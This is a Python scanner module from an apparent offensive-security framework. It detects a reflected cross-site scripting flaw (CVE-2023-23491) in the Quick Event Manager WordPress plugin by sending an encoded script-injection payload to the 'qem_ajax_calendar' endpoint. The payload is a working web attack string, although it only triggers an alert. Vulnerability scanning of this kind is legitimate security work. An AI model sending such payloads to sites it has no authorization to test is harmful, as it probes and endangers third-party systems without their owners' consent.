#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Quick Event Manager WordPress Plugin, version < 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Quick Event Manager < 9.7.5 - Cross-Site Scripting Detection',
        'description': "The Quick Event Manager WordPress Plugin, version < 9.7.5, is affected by a reflected cross-site scripting vulnerability in the 'category' parameter of its 'qem_ajax_calendar' action.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wordpress', 'wp', 'wp-plugin', 'wpscan', 'xss', 'quick-event-manager', 'fullworksplugins', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/49178a9d-0500-4e3e-8ea1-6cd4eeda2a4e',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-23491',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/JoshuaMart/JoshuaMart',
        ],
        'cve': 'CVE-2023-23491',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=qem_ajax_calendar&category=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>', 'qem_calendar',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Quick Event Manager < 9.7.5 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=qem_ajax_calendar&category=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

